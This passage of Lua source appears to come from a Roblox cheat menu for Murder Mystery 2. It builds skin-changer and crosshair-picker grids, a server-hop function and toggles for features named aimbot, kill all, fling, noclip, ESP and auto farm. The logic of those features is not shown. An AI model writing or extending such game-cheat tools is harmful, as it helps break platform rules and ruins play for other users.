						Title = "Round started  ·  you are " .. str18,
						Content = "Murderer: " .. func268(flag282) .. "\nSheriff: " .. func268(value303),
						Icon = str18 == "Murderer" and "skull" or str18 == "Sheriff" and "shield" or "swords",
						Duration = 6,
					})
				end)
			end
		end)
	end))
end

_G.__BuildPlayersTab()

do
	local themeColor = _G.__ThemeColor

	local function func269(obj71, text4)
		local list48, flag284 = _G.SkinChanger.ListSkins(text4)
		if not list48 or #list48 == 0 then
			obj71:Paragraph({ Title = "Skins unavailable", Desc = tostring(flag284 or "No " .. text4 .. " skins in the list.") })
			return
		end
		local scrollingFrame = obj71.ContainerFrame and obj71.ContainerFrame:FindFirstChild("ScrollingFrame")

		if not scrollingFrame then
			obj71:Paragraph({
				Title = "Skins unavailable",
				Desc = "This WindUI build does not expose a tab canvas to draw into.",
			})

			return
		end

		local tbl146 = _G.SkinChanger.LoadData()
		local rarityColor = _G.SkinChanger.RarityColor
		local frame = Instance.new("Frame")
		frame.Name = "MM2SkinGrid"
		frame.BackgroundTransparency = 1
		frame.Size = UDim2.new(1, 0, 0, 0)
		frame.AutomaticSize = Enum.AutomaticSize.Y
		local uiListLayout = Instance.new("UIListLayout")
		uiListLayout.FillDirection = Enum.FillDirection.Vertical
		uiListLayout.Padding = UDim.new(0, 8)
		uiListLayout.SortOrder = Enum.SortOrder.LayoutOrder
		uiListLayout.Parent = frame
		local textBox = Instance.new("TextBox")
		textBox.Name = "Search"
		textBox.LayoutOrder = 1
		textBox.Size = UDim2.new(1, 0, 0, 34)
		textBox.BorderSizePixel = 0
		textBox.ClearTextOnFocus = false
		textBox.Text = ""
		textBox.PlaceholderText = "Search " .. #list48 .. " " .. text4:lower() .. " skins..."
		textBox.TextSize = 14
		textBox.Font = Enum.Font.GothamMedium
		textBox.TextXAlignment = Enum.TextXAlignment.Left
		textBox.Parent = frame
		local uiPadding = Instance.new("UIPadding")
		uiPadding.PaddingLeft = UDim.new(0, 12)
		uiPadding.Parent = textBox
		local uiCorner = Instance.new("UICorner")
		uiCorner.CornerRadius = UDim.new(0, 10)
		uiCorner.Parent = textBox
		local uiStroke = Instance.new("UIStroke")
		uiStroke.Thickness = 1
		uiStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
		uiStroke.Parent = textBox
		local textLabel = Instance.new("TextLabel")
		textLabel.Name = "Status"
		textLabel.LayoutOrder = 2
		textLabel.Size = UDim2.new(1, 0, 0, 16)
		textLabel.BackgroundTransparency = 1
		textLabel.Text = "Tap a skin to equip it."
		textLabel.TextSize = 13
		textLabel.Font = Enum.Font.Gotham
		textLabel.TextXAlignment = Enum.TextXAlignment.Left
		textLabel.Parent = frame
		local frame2 = Instance.new("Frame")
		frame2.Name = "Grid"
		frame2.LayoutOrder = 3
		frame2.BackgroundTransparency = 1
		frame2.Size = UDim2.new(1, 0, 0, 0)
		frame2.AutomaticSize = Enum.AutomaticSize.Y
		frame2.Parent = frame
		local uiGridLayout = Instance.new("UIGridLayout")
		uiGridLayout.CellSize = UDim2.fromOffset(72, 72)
		uiGridLayout.CellPadding = UDim2.fromOffset(8, 8)
		uiGridLayout.SortOrder = Enum.SortOrder.LayoutOrder
		uiGridLayout.Parent = frame2
		local value305 = nil
		local tbl147 = {}

		for i, item77 in ipairs(list48) do
			local meta = tbl146 and tbl146[item77.Key]
			meta = meta and meta.Meta
			local color = rarityColor[item77.Rarity] or Color3.fromRGB(200, 200, 200)
			local name = item77.Chroma and "Chroma " .. item77.Name or item77.Name
			local imageButton = Instance.new("ImageButton")
			imageButton.Name = item77.Key
			imageButton.LayoutOrder = i
			imageButton.BorderSizePixel = 0
			imageButton.AutoButtonColor = true
			imageButton.Image = meta and meta.Image or ""
			imageButton.ScaleType = Enum.ScaleType.Fit
			imageButton.Parent = frame2
			local uiCorner2 = Instance.new("UICorner")
			uiCorner2.CornerRadius = UDim.new(0, 10)
			uiCorner2.Parent = imageButton
			local uiStroke2 = Instance.new("UIStroke")
			uiStroke2.Color = color
			uiStroke2.Thickness = 1
			uiStroke2.Transparency = 0.35
			uiStroke2.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
			uiStroke2.Parent = imageButton
			local textLabel2 = Instance.new("TextLabel")
			textLabel2.Name = "Caption"
			textLabel2.AnchorPoint = Vector2.new(0.5, 1)
			textLabel2.Position = UDim2.new(0.5, 0, 1, -3)
			textLabel2.Size = UDim2.new(1, -6, 0, 22)
			textLabel2.BackgroundTransparency = 1
			textLabel2.Text = item77.Name
			textLabel2.TextColor3 = Color3.fromRGB(245, 245, 245)
			textLabel2.TextStrokeTransparency = 1
			textLabel2.TextSize = 10
			textLabel2.Font = Enum.Font.GothamMedium
			textLabel2.TextWrapped = true
			textLabel2.TextYAlignment = Enum.TextYAlignment.Bottom
			textLabel2.Parent = imageButton

			if item77.Chroma then
				local frame3 = Instance.new("Frame")
				frame3.Name = "ChromaTag"
				frame3.AnchorPoint = Vector2.new(0.5, 1)
				frame3.Position = UDim2.new(0.5, 0, 1, -16)
				frame3.Size = UDim2.fromOffset(0, 12)
				frame3.AutomaticSize = Enum.AutomaticSize.X
				frame3.BackgroundColor3 = Color3.fromRGB(0, 213, 255)
				frame3.BorderSizePixel = 0
				frame3.ZIndex = 3
				frame3.Parent = imageButton
				Instance.new("UICorner", frame3).CornerRadius = UDim.new(1, 0)
				local uiStroke3 = Instance.new("UIStroke")
				uiStroke3.Color = Color3.fromRGB(10, 10, 16)
				uiStroke3.Thickness = 1
				uiStroke3.Transparency = 0.25
				uiStroke3.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
				uiStroke3.Parent = frame3
				local imageLabel = Instance.new("ImageLabel")
				imageLabel.Name = "BG"
				imageLabel.Size = UDim2.fromScale(1, 1)
				imageLabel.BackgroundTransparency = 1
				imageLabel.Image = "rbxassetid://2576540162"
				imageLabel.ScaleType = Enum.ScaleType.Stretch
				imageLabel.ZIndex = 3
				imageLabel.Parent = frame3
				Instance.new("UICorner", imageLabel).CornerRadius = UDim.new(1, 0)
				local textLabel3 = Instance.new("TextLabel")
				textLabel3.Name = "TagName"
				textLabel3.AutomaticSize = Enum.AutomaticSize.X
				textLabel3.Size = UDim2.fromOffset(0, 12)
				textLabel3.BackgroundTransparency = 1
				textLabel3.Text = "Chroma"
				textLabel3.TextColor3 = Color3.new(1, 1, 1)
				textLabel3.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Heavy)
				textLabel3.TextSize = 9
				textLabel3.TextStrokeColor3 = Color3.fromRGB(20, 10, 40)
				textLabel3.TextStrokeTransparency = 0.2
				textLabel3.ZIndex = 4
				textLabel3.Parent = frame3
				local uiPadding2 = Instance.new("UIPadding")
				uiPadding2.PaddingLeft = UDim.new(0, 6)
				uiPadding2.PaddingRight = UDim.new(0, 6)
				uiPadding2.Parent = textLabel3
			end

			imageButton.MouseEnter:Connect(function()
				textLabel.Text = name .. "  ·  " .. (item77.Chroma and "Chroma" or item77.Rarity)
			end)

			imageButton.MouseButton1Click:Connect(function()
				_G.SkinChanger.Select(text4, item77.Key)
				local flag285, value306 = _G.SkinChanger.Apply(text4)

				if value305 and value305 ~= uiStroke2 then
					value305.Thickness = 1
					value305.Transparency = 0.35
				end

				value305 = uiStroke2
				uiStroke2.Thickness = 2.5
				uiStroke2.Transparency = 0
				textLabel.Text = name .. "  ·  " .. tostring(value306)

				if _G.WindNotify then
					_G.WindNotify("Skin Changer", name .. ": " .. tostring(value306), flag285 and "circle-check" or "circle-x")
				end
			end)

			local n2 = #tbl147 + 1
			local rarity = item77.Rarity
			tbl147[n2] = { Tile = imageButton, Search = name:lower() .. " " .. rarity:lower() }
		end

		_G.__OnTheme(function()
			local ElementBackground = themeColor("ElementBackground", Color3.fromRGB(28, 28, 32))
			textBox.BackgroundColor3 = ElementBackground
			textBox.BackgroundTransparency = 0
			textBox.TextColor3 = themeColor("Text", Color3.fromRGB(235, 235, 235))
			textBox.PlaceholderColor3 = themeColor("Placeholder", Color3.fromRGB(130, 130, 130))
			uiStroke.Color = themeColor("Primary", Color3.fromRGB(255, 178, 63))
			uiStroke.Transparency = 0.7
			textLabel.TextColor3 = themeColor("Placeholder", Color3.fromRGB(160, 160, 160))

			for _, item78 in ipairs(tbl147) do
				item78.Tile.BackgroundColor3 = themeColor("Tile", ElementBackground)
				item78.Tile.BackgroundTransparency = 0
			end
		end)

		textBox:GetPropertyChangedSignal("Text"):Connect(function()
			local str19 = textBox.Text:lower():gsub("^%s+", ""):gsub("%s+$", "")
			local n2 = 0

			for _, item79 in ipairs(tbl147) do
				local visible = str19 == "" or item79.Search:find(str19, 1, true) ~= nil
				item79.Tile.Visible = visible

				if visible then
					n2 += 1
				end
			end

			textLabel.Text = str19 == "" and "Tap a skin to equip it." or n2 .. " of " .. #tbl147 .. " match \"" .. str19 .. "\""
		end)

		frame.Parent = scrollingFrame
	end

	func269(tbl121.GunSkins, "Gun")
	func269(tbl121.KnifeSkins, "Knife")
end

_G.BuildCrosshairPicker = function()
	local tbl148 = {
		{ Name = "Little Crosshair", Id = "1827745864" },
		{ Name = "Clean Crosshair", Id = "4048495272" },
		{ Name = "Little Crosshair 2", Id = "1827745860" },
		{ Name = "Glow Circle", Id = "10891594364" },
		{ Name = "Kitten", Id = "5998624788" },
		{ Name = "Soft Crosshair", Id = "5689419560" },
		{ Name = "Thin Crosshair", Id = "2207556774" },
		{ Name = "Gun Cursor", Id = "426730675" },
		{ Name = "43 Cross", Id = "2128690040" },
		{ Name = "Counter Blox", Id = "2827093428" },
		{ Name = "Crosshair 9524", Id = "9524023226" },
		{ Name = "Counter Blox 2", Id = "3750055370" },
		{ Name = "Dot", Id = "2943445535" },
		{ Name = "Heart", Id = "11754490336" },
		{ Name = "Cyan", Id = "358650771" },
		{ Name = "Crosshairs", Id = "6398507494" },
		{ Name = "Green Dot", Id = "240080506" },
		{ Name = "White Crosshair", Id = "749187669" },
		{ Name = "Pink", Id = "358650766" },
		{ Name = "Crosshair Dot", Id = "1389344386" },
		{ Name = "Crosshair Kitten 2", Id = "5998624778" },
		{ Name = "Gh0stly", Id = "2169048245" },
		{ Name = "Pastel Kitty", Id = "11351620355" },
		{ Name = "Pink Star", Id = "11719595129" },
		{ Name = "Rainbow Dot", Id = "4000131509" },
		{ Name = "Red Crosshair", Id = "6480864794" },
		{ Name = "Crosshair Zoom", Id = "9720078113" },
		{ Name = "ZombieCon", Id = "129875025" },
		{ Name = "Exclusive Crosshair", Id = "2159978195" },
		{ Name = "Red Dot Aim", Id = "240080272" },
		{ Name = "Alt Crosshair", Id = "4941755400" },
		{ Name = "Test Crosshair", Id = "1469004289" },
		{ Name = "Soft Dot", Id = "3521125035" },
		{ Name = "Crosshair Set", Id = "1489774665" },
		{ Name = "Symbol Crosshair", Id = "569870649" },
		{ Name = "Crosshair 7019", Id = "7019318577" },
		{ Name = "Red Crosshair 2", Id = "6480864782" },
		{ Name = "Crsshair", Id = "2614612882" },
		{ Name = "Crosshair 9472", Id = "9472683590" },
		{ Name = "Depressed Crosshair", Id = "11390723044" },
		{ Name = "Heart Crosshair", Id = "11722368344" },
		{ Name = "Glow Circle 2", Id = "10891594349" },
		{ Name = "Crosshair 1086", Id = "10868459554" },
		{ Name = "43 Cross 2", Id = "2128690043" },
		{ Name = "Crosshair Symbol", Id = "6079707648" },
		{ Name = "Pastel Kitty 2", Id = "11351620343" },
		{ Name = "Heart Crosshair 2", Id = "11754490323" },
		{ Name = "Small Crosshair 2.0", Id = "2526607594" },
		{ Name = "Crosshair 7905", Id = "7905983439" },
		{ Name = "Relly 2", Id = "11722088774" },
		{ Name = "White Crosshair 2", Id = "749187664" },
		{ Name = "Crosshair >.<", Id = "10831379335" },
		{ Name = "Small Crosshair 2.0 B", Id = "2526607598" },
		{ Name = "H Cursor", Id = "5144114880" },
		{ Name = "T-Mobile", Id = "11960132111" },
		{ Name = "Cursor Hello Kitty", Id = "11716290197" },
		{ Name = "Cursor 3", Id = "11716557686" },
		{ Name = "Crosshair Block", Id = "7242005920" },
		{ Name = "K6uro Dot", Id = "11716452437" },
		{ Name = "Y2K Cross", Id = "11767037107" },
		{ Name = "White Crosshair 3", Id = "6480864064" },
		{ Name = "Cursor 2", Id = "11716159644" },
		{ Name = "Crosshair Heart", Id = "10878218322" },
		{ Name = "Crosshair 1086 B", Id = "10868459539" },
		{ Name = "Gengar", Id = "11759293347" },
		{ Name = "Short Crosshair", Id = "2526593748" },
		{ Name = "Heart Cursor", Id = "11722081515" },
		{ Name = "Blaster", Id = "7810818531" },
		{ Name = "Pixel Heart", Id = "13034143275" },
		{ Name = "Triangle", Id = "10164277641" },
		{ Name = "Rip Lol", Id = "2167171797" },
		{ Name = "Main", Id = "11150110589" },
		{ Name = "Nice Crosshair", Id = "6647211778" },
		{ Name = "Pika Crosshair", Id = "11754499452" },
		{ Name = "Pompom Crosshair", Id = "11747026268" },
		{ Name = "ZombKitty Crosshair", Id = "11767337318" },
		{ Name = "XBOX Crosshair", Id = "11759202791" },
		{ Name = "Cutie Mark Star", Id = "158554297" },
		{ Name = "Crosshair A", Id = "11716453554" },
		{ Name = "Aim", Id = "7051824015" },
		{ Name = "SuperColor", Id = "11716455808" },
		{ Name = "Kuromi", Id = "7173989509" },
		{ Name = "Pink Crosshair", Id = "11716485793" },
		{ Name = "Hello Kitty Heart", Id = "7397723594" },
		{ Name = "Unknown Crosshair", Id = "11716687704" },
		{ Name = "Crosshair B", Id = "11717093063" },
		{ Name = "Crosshair C", Id = "11717104785" },
		{ Name = "Hello Kitty Bow", Id = "11717287400" },
		{ Name = "Hello Kitty Christmas", Id = "11717288272" },
		{ Name = "Hello Kitty Cursor", Id = "11717813996" },
		{ Name = "HKC", Id = "11717828297" },
		{ Name = "Big Aim 2", Id = "2555584348" },
		{ Name = "Turtle", Id = "7590894535" },
		{ Name = "Hello Kitty Cursor 2", Id = "11718192673" },
		{ Name = "Kuromi Maid", Id = "7660329894" },
		{ Name = "Hello Kitty Cursor 3", Id = "11719412806" },
		{ Name = "Osu Cursor", Id = "7820635056" },
		{ Name = "Cutie Mark Blue Star", Id = "170174107" },
		{ Name = "Cat Cursor", Id = "11722553511" },
		{ Name = "Kuromi 1", Id = "11723083138" },
		{ Name = "Sasuke Curse Mark", Id = "11723817205" },
		{ Name = "Santa Dust Sans", Id = "8890685159" },
		{ Name = "Bright Blue Crosshair", Id = "11724945237" },
		{ Name = "Unknown Crosshair 28", Id = "11726821301" },
		{ Name = "Cursor 1", Id = "11733622734" },
		{ Name = "Cursor 2", Id = "11733801922" },
		{ Name = "Cursor 3", Id = "11734552820" },
		{ Name = "Power Star", Id = "1718840561" },
		{ Name = "Santa Sam", Id = "4788466659" },
		{ Name = "19", Id = "11734623772" },
		{ Name = "21", Id = "11734712236" },
		{ Name = "22", Id = "11734738174" },
		{ Name = "Hello Kitty PNG", Id = "9509978501" },
	}

	local themeColor = _G.__ThemeColor
	local value307 = tbl122.Box(_G.CrosshairTab, "Crosshair", "locate-fixed")

	tbl122.Toggle(value307, {
		Title = "Enable Crosshair",
		Flag = "CrosshairEnabled",
		Set = "CrosshairSetEnabled",
		Notify = "crosshair",
	})

	tbl122.Slider(value307, {
		Title = "Size",
		Flag = "CrosshairSize",
		Min = 24,
		Max = 160,
		Default = 64,
		Step = 2,
		Set = "CrosshairSetSize",
	})

	tbl122.Toggle(value307, { Title = "Spin", Flag = "CrosshairSpinEnabled", Set = "CrosshairSetSpin" })

	tbl122.Slider(value307, {
		Title = "Spin Speed",
		Flag = "CrosshairSpinSpeed",
		Min = 0,
		Max = 720,
		Default = 180,
		Step = 10,
		Set = "CrosshairSetSpinSpeed",
	})

	tbl122.Toggle(value307, {
		Title = "Hide Shift Lock Crosshair",
		Flag = "HideShiftLockCrosshair",
		Set = "ShiftLockCrosshairSetEnabled",
		Notify = "eye-off",
	})

	local scrollingFrame = _G.CrosshairTab.ContainerFrame and _G.CrosshairTab.ContainerFrame:FindFirstChild("ScrollingFrame")

	if not scrollingFrame then
		_G.CrosshairTab:Paragraph({
			Title = "Crosshair picker unavailable",
			Desc = "This WindUI build does not expose a tab canvas.",
		})

		return
	end

	local frame = Instance.new("Frame")
	frame.Name = "CrosshairPicker"
	frame.BackgroundTransparency = 1
	frame.Size = UDim2.new(1, 0, 0, 0)
	frame.AutomaticSize = Enum.AutomaticSize.Y
	frame.LayoutOrder = 100000
	local uiListLayout = Instance.new("UIListLayout")
	uiListLayout.FillDirection = Enum.FillDirection.Vertical
	uiListLayout.Padding = UDim.new(0, 8)
	uiListLayout.SortOrder = Enum.SortOrder.LayoutOrder
	uiListLayout.Parent = frame
	local textLabel = Instance.new("TextLabel")
	textLabel.Name = "Selected"
	textLabel.LayoutOrder = 1
	textLabel.Size = UDim2.new(1, 0, 0, 18)
	textLabel.BackgroundTransparency = 1
	textLabel.Text = "Choose a crosshair below."
	textLabel.TextSize = 13
	textLabel.Font = Enum.Font.Gotham
	textLabel.TextXAlignment = Enum.TextXAlignment.Left
	textLabel.Parent = frame
	local frame2 = Instance.new("Frame")
	frame2.Name = "Grid"
	frame2.LayoutOrder = 2
	frame2.BackgroundTransparency = 1
	frame2.Size = UDim2.new(1, 0, 0, 0)
	frame2.AutomaticSize = Enum.AutomaticSize.Y
	frame2.Parent = frame
	local uiGridLayout = Instance.new("UIGridLayout")
	uiGridLayout.CellSize = UDim2.fromOffset(84, 84)
	uiGridLayout.CellPadding = UDim2.fromOffset(8, 8)
	uiGridLayout.SortOrder = Enum.SortOrder.LayoutOrder
	uiGridLayout.Parent = frame2
	local list49 = {}
	local value308 = nil

	local function func270(param280)
		param280.Color = themeColor("Placeholder", Color3.fromRGB(110, 115, 130))
		param280.Thickness = 1
		param280.Transparency = 0.55
	end

	local function func271(param281)
		param281.Color = themeColor("Primary", Color3.fromRGB(255, 178, 63))
		param281.Thickness = 2
		param281.Transparency = 0
	end

	for i, item80 in ipairs(tbl148) do
		local imageButton = Instance.new("ImageButton")
		imageButton.Name = item80.Name:gsub("%W", "")
		imageButton.LayoutOrder = i
		imageButton.Size = UDim2.fromOffset(84, 84)
		imageButton.BorderSizePixel = 0
		imageButton.AutoButtonColor = false
		imageButton.Image = ""
		imageButton.ScaleType = Enum.ScaleType.Fit
		imageButton.ClipsDescendants = true
		imageButton.Parent = frame2
		local imageLabel = Instance.new("ImageLabel")
		imageLabel.Name = "Preview"
		imageLabel.AnchorPoint = Vector2.new(0.5, 0.5)
		imageLabel.Position = UDim2.new(0.5, 0, 0.43, 0)
		imageLabel.Size = UDim2.new(1, -8, 1, -24)
		imageLabel.BackgroundTransparency = 1
		imageLabel.BorderSizePixel = 0
		imageLabel.ScaleType = Enum.ScaleType.Fit
		imageLabel.Image = "rbxthumb://type=Asset&id=" .. item80.Id .. "&w=150&h=150"
		imageLabel.ZIndex = 3
		imageLabel.Parent = imageButton
		local uiCorner = Instance.new("UICorner")
		uiCorner.CornerRadius = UDim.new(0, 10)
		uiCorner.Parent = imageButton
		local uiStroke = Instance.new("UIStroke")
		uiStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
		uiStroke.Parent = imageButton
		local frame3 = Instance.new("Frame")
		frame3.AnchorPoint = Vector2.new(0.5, 1)
		frame3.Position = UDim2.new(0.5, 0, 1, 0)
		frame3.Size = UDim2.new(1, 0, 0, 24)
		frame3.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		frame3.BackgroundTransparency = 0.45
		frame3.BorderSizePixel = 0
		frame3.ZIndex = 4
		frame3.Parent = imageButton
		local textLabel2 = Instance.new("TextLabel")
		textLabel2.BackgroundTransparency = 1
		textLabel2.Size = UDim2.new(1, -6, 1, 0)
		textLabel2.Position = UDim2.fromOffset(3, 0)
		textLabel2.Text = item80.Name
		textLabel2.TextColor3 = Color3.fromRGB(240, 240, 245)
		textLabel2.TextSize = 10
		textLabel2.Font = Enum.Font.GothamMedium
		textLabel2.TextWrapped = true
		textLabel2.TextYAlignment = Enum.TextYAlignment.Center
		textLabel2.ZIndex = 5
		textLabel2.Parent = frame3

		imageButton.MouseEnter:Connect(function()
			if uiStroke ~= value308 then
				uiStroke.Transparency = 0
			end
		end)

		imageButton.MouseLeave:Connect(function()
			if uiStroke ~= value308 then
				uiStroke.Transparency = 0.55
			end
		end)

		imageButton.MouseButton1Click:Connect(function()
			_G.CrosshairSetDecal(item80.Id)

			if value308 and value308 ~= uiStroke then
				func270(value308)
			end

			value308 = uiStroke
			func271(uiStroke)
			textLabel.Text = "Selected: " .. item80.Name
			queueConfigSave()
		end)

		local id = item80.Id

		if tostring(_G.CrosshairDecalId) == id then
			value308 = uiStroke
			textLabel.Text = "Selected: " .. item80.Name
		end

		list49[#list49 + 1] = { Card = imageButton, Stroke = uiStroke }
	end

	_G.__OnTheme(function()
		local ElementBackground = themeColor("ElementBackground", Color3.fromRGB(28, 28, 34))
		textLabel.TextColor3 = themeColor("Placeholder", Color3.fromRGB(170, 170, 170))

		for _, item81 in ipairs(list49) do
			item81.Card.BackgroundColor3 = themeColor("Tile", ElementBackground)
			item81.Card.BackgroundTransparency = 0

			if item81.Stroke == value308 then
				func271(item81.Stroke)
			else
				func270(item81.Stroke)
			end
		end
	end)

	frame.Parent = scrollingFrame
end

_G.BuildCrosshairPicker()
tbl121.Home:Select()

do
	local function callback7()
		if _G.StopRoleFling then
			_G.StopRoleFling()
		end

		if _G.AutoFarmSetEnabled then
			_G.AutoFarmSetEnabled(false)
		end

		if _G.AutoThrowKnifeSetEnabled then
			_G.AutoThrowKnifeSetEnabled(false)
		end

		_G.__KillAllLoopId = nil
		_G.KillAllBusy = false

		if _G.ThrowAimbotButtonSetEnabled then
			_G.ThrowAimbotButtonSetEnabled(false)
		end

		if _G.AutoGrabGunSetEnabled then
			_G.AutoGrabGunSetEnabled(false)
		end

		if _G.KillAllButtonSetEnabled then
			_G.KillAllButtonSetEnabled(false)
		end

		if _G.QuickRageShootButtonSetEnabled then
			_G.QuickRageShootButtonSetEnabled(false)
		end

		if _G.AntiFlingSetEnabled then
			_G.AntiFlingSetEnabled(false)
		end

		if _G.ShiftLockCrosshairSetEnabled then
			_G.ShiftLockCrosshairSetEnabled(false)
		end

		if _G.PlayerFlySetEnabled then
			_G.PlayerFlySetEnabled(false)
		end

		if _G.FpsBoostSetEnabled then
			_G.FpsBoostSetEnabled(false)
		end

		_G.__FarmWebhookLoopId = nil

		if _G.AutoCaseSetEnabled then
			_G.AutoCaseSetEnabled(false)
		end

		_G.__AutoCaseLoopId = nil
		_G.__AutoCaseUiLoopId = nil
		_G.__HomeLoopId = nil
		_G.__FarmStatsLoopId = nil

		if _G.CoinESPConn then
			for _, item82 in ipairs(_G.CoinESPConn) do
				pcall(function()
					item82:Disconnect()
				end)
			end
		end

		_G.__CoinRescanLoopId = nil
		_G.__RoleRescanLoopId = nil
		_G.__RoleRefreshBurstId = nil
		_G.__BagPollLoopId = nil
		_G.__DailyQuestLoopId = nil
		_G.__QuickShootLoopId = nil
		_G.__AutoThrowKnifeLoopId = nil
		_G.__AutoGrabGunLoopId = nil

		pcall(function()
			RunService:UnbindFromRenderStep("MarbegQuickShotCameraLock")
		end)

		pcall(function()
			RunService:UnbindFromRenderStep("MarbegShiftLockAim")
		end)

		pcall(function()
			RunService:UnbindFromRenderStep("MarbegTriggerFOVRing")
		end)

		pcall(function()
			RunService:UnbindFromRenderStep("MarbegTriggerMarker")
		end)

		pcall(function()
			RunService:UnbindFromRenderStep("MarbegCrosshair")
		end)

		pcall(function()
			RunService:UnbindFromRenderStep("MarbegHideShiftLockCursor")
		end)

		pcall(function()
			RunService:UnbindFromRenderStep("MarbegESPOverlay")
		end)

		if _G.ESPOverlayGui then
			pcall(function()
				_G.ESPOverlayGui:Destroy()
			end)
		end

		if _G.__KillFxConns then
			for _, killFxConn in ipairs(_G.__KillFxConns) do
				pcall(function()
					killFxConn:Disconnect()
				end)
			end
		end

		if _G.KillFxGui then
			pcall(function()
				_G.KillFxGui:Destroy()
			end)
		end

		if _G.WorldVisualsReset then
			pcall(_G.WorldVisualsReset)
		end

		if _G.CameraSettingsReset then
			pcall(_G.CameraSettingsReset)
		end

		_G.KnifeAuraEnabled = false

		pcall(function()
			RunService:UnbindFromRenderStep("MarbegCameraFOV")
		end)

		if _G.AutoFarmCharConn then
			pcall(function()
				_G.AutoFarmCharConn:Disconnect()
			end)
		end

		if _G.CoinESPFolder then
			pcall(function()
				_G.CoinESPFolder:Destroy()
			end)
		end

		if _G.RoleESPFolder then
			pcall(function()
				_G.RoleESPFolder:Destroy()
			end)
		end

		if _G.DailyQuestCheckerGui then
			pcall(function()
				_G.DailyQuestCheckerGui:Destroy()
			end)
		end

		if _G.TriggerMarkerGui then
			pcall(function()
				_G.TriggerMarkerGui:Destroy()
			end)
		end

		if _G.QuickShootGui then
			pcall(function()
				_G.QuickShootGui:Destroy()
			end)
		end

		if _G.QuickRageShootGui then
			pcall(function()
				_G.QuickRageShootGui:Destroy()
			end)
		end

		if _G.ThrowAimbotGui then
			pcall(function()
				_G.ThrowAimbotGui:Destroy()
			end)
		end

		if _G.KillAllGui then
			pcall(function()
				_G.KillAllGui:Destroy()
			end)
		end

		pcall(function()
			obj46:Destroy()
		end)

		_G.WindUIWindow = nil
	end

	local HttpService = game:GetService("HttpService")
	local TeleportService = game:GetService("TeleportService")
	local flag286 = false
	_G.__RecentServers = _G.__RecentServers or {}

	_G.HopServer = function()
		if flag286 then
			return false, "Already hopping"
		end
		flag286 = true

		local ok, result, result2 = pcall(function()
			local str20 = ("https://games.roblox.com/v1/games/%d/servers/Public?sortOrder=Asc&limit=100"):format(game.PlaceId)
			local flag287 = func1(str20)
			if not flag287 then
				return nil, "Could not reach the server list"
			end
			local data = HttpService:JSONDecode(flag287)
			if type(data) ~= "table" or type(data.data) ~= "table" then
				return nil, "Unexpected server list"
			end
			local huge = math.huge
			local id = nil

			for _, item83 in ipairs(data.data) do
				if type(item83.id) == "string" and item83.id ~= game.JobId and not _G.__RecentServers[item83.id] and type(item83.playing) == "number" and type(item83.maxPlayers) == "number" and item83.playing < item83.maxPlayers and item83.playing < huge then
					id = item83.id
					huge = item83.playing
				end
			end

			if not id then
				return nil, "No other server available"
			end
			return id, ("Joining a server with %d players"):format(huge)
		end)

		if not ok or not result then
			flag286 = false
			result2 = type(result2) == "string" and result2

			if result2 then
				result = result2
			else
				result = type(result) == "string" and result
			end

			return false, result or "Server hop failed"
		end

		local value309 = result
		_G.__RecentServers[value309] = true

		task.delay(120, function()
			_G.__RecentServers[value309] = nil
		end)

		local ok2 = pcall(function()
			TeleportService:TeleportToPlaceInstance(game.PlaceId, value309, localPlayer)
		end)

		task.delay(5, function()
			flag286 = false
		end)

		return ok2, ok2 and "Teleporting..." or "Teleport was refused"
	end

	local obj72 = tbl122.Box(tbl121.Buttons, "Layout", "layout-grid")
	_G.LockButtonsToggle = tbl122.Toggle(obj72, { Title = "Lock Buttons", Flag = "LockButtons", Set = "LockButtonsSetEnabled", Notify = "lock" })

	obj72:Slider({
		Title = "Button Size",
		Step = 1,
		Flag = "ActionButtonSize",
		Value = { Min = 48, Max = 120, Default = _G.ActionButtonSize or 72 },
		Callback = function(value)
			if _G.__SetActionButtonSize then
				_G.__SetActionButtonSize(value)
			end

			if _G.__SaveActionButtonLayout then
				_G.__SaveActionButtonLayout()
			end

			queueConfigSave()
		end,
	})

	tbl122.Color(obj72, {
		Title = "Text Color",
		Flag = "ActionButtonTextColor",
		Default = Color3.fromRGB(255, 255, 255),
		Set = "SetActionButtonTextColor",
	})

	obj72:Button({
		Title = "Reset Size",
		Icon = "maximize-2",
		Callback = function()
			if _G.__SetActionButtonSize then
				_G.__SetActionButtonSize(72)
			end

			if _G.__SaveActionButtonLayout then
				_G.__SaveActionButtonLayout()
			end

			queueConfigSave()
		end,
	})

	tbl122.Action(obj72, {
		Title = "Reset Positions",
		Icon = "refresh-ccw",
		Run = function()
			local resetActionButtonPositions = _G.__ResetActionButtonPositions and _G.__ResetActionButtonPositions()
			return resetActionButtonPositions, resetActionButtonPositions and "Positions reset." or "Could not reset positions."
		end,
	})

	local value310 = tbl122.Box(tbl121.Buttons, "Sheriff", "shield")

	tbl122.Toggle(value310, {
		Title = "Shoot Murderer",
		Flag = "ShootLegitButton",
		Set = "QuickShootButtonSetEnabled",
		Notify = "crosshair",
	})

	tbl122.Toggle(value310, {
		Title = "Rage Shoot",
		Flag = "ShootRageButton",
		Set = "QuickRageShootButtonSetEnabled",
		Notify = "zap",
	})

	local value311 = tbl122.Box(tbl121.Buttons, "Murderer", "sword")

	tbl122.Toggle(value311, {
		Title = "Throw Knife",
		Flag = "ThrowAimbotButton",
		Set = "ThrowAimbotButtonSetEnabled",
		Notify = "mouse-pointer-click",
	})

	tbl122.Toggle(value311, {
		Title = "Kill All",
		Flag = "KillAllButton",
		Set = "KillAllButtonSetEnabled",
		Notify = "skull",
	})

	local value312 = tbl122.Box(tbl121.Buttons, "Fling", "wind")

	tbl122.Toggle(value312, {
		Title = "Fling Murderer",
		Flag = "FlingMurdererButton",
		Set = "FlingMurdererButtonSetEnabled",
		Notify = "skull",
	})

	tbl122.Toggle(value312, {
		Title = "Fling Hero / Sheriff",
		Flag = "FlingSheriffButton",
		Set = "FlingSheriffButtonSetEnabled",
		Notify = "shield",
	})

	local value313 = tbl122.Box(tbl121.Buttons, "Player", "user")

	tbl122.Toggle(value313, {
		Title = "Bomb Boost",
		Flag = "BombBoostButton",
		Set = "BombBoostButtonSetEnabled",
		Notify = "bomb",
	})

	tbl122.Toggle(value313, { Title = "Noclip", Flag = "NoclipButton", Set = "NoclipButtonSetEnabled", Notify = "ghost" })
